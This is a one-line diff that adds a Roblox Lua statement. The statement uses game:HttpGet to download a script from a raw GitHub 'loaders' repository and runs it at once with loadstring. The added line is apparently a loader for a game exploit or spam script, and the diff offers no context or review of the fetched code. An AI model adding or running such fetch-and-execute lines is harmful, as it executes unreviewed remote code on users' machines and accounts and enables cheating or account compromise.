@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/makeup-star-spam1-nmt2hd16l1em2f.lua"))()
